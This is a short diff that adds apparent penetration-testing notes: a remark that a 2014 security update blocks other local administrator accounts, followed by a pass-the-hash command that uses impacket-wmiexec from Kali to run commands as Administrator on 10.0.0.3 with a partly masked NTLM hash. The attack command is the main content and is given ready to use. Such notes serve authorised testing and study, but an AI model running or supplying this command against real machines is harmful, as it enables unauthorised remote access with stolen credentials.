@@ -1,0 +1,4 @@
+2014 security update don't permit any other local admin account.
+
+# In Kali with Pass the Hash:
+/usr/bin/impacket-wmiexec -hashes :2892D26CDFxxxEB3B9F05C425E Administrator@10.0.0.3
